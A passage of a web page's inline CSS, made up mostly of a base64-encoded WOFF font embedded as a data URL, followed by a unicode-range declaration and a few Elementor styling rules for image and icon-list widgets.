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)format("woff");
                unicode-range: U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD
            }

            .elementor-widget-image {
                text-align: center
            }

            .elementor-widget-image a {
                display: inline-block
            }

            .elementor-widget-image img {
                vertical-align: middle;
                display: inline-block
            }

            .elementor-widget .elementor-icon-list-items {
                list-style-type: none;
                margin: 0
            }

            .elementor-widget .elementor-icon-list-item {
                margin: 0;
                padding: 0;
                position: relative
            }

            .elementor-widget .elementor-icon-list-item:after {
                position: absolute;
                bottom: 0;
                width: 100%
            }

